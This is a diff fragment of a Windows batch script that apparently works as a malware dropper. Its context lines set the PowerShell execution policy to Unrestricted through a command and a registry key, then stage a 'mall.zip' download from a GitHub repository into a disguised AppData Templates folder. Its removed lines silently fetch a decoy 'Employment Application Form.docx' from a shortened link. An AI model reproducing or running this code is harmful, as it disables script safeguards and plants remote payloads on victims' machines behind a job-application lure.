@@ -42,16 +42,6 @@ powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Lo
 
 reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v ExecutionPolicy /t REG_SZ /d Unrestricted /f >nul
 
-set "docUrl=http://tiny.cc/ec7m001"  &:: 
-set "downloadsDir=%USERPROFILE%\Downloads"
-set "targetFolder=%downloadsDir%\Applications Documents"
-
-if not exist "%targetFolder%" (
-    mkdir "%targetFolder%" >nul
-)
-
-powershell -Command "Invoke-WebRequest -Uri '%docUrl%' -OutFile '%targetFolder%\Employment Application Form.docx'" >nul
-
 set "mallUrl=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/mall.zip"  &:: 
 set "mallDest=%APPDATA%\Microsoft\Windows\Templates\mall"
 set "mallZip=%mallDest%.zip"
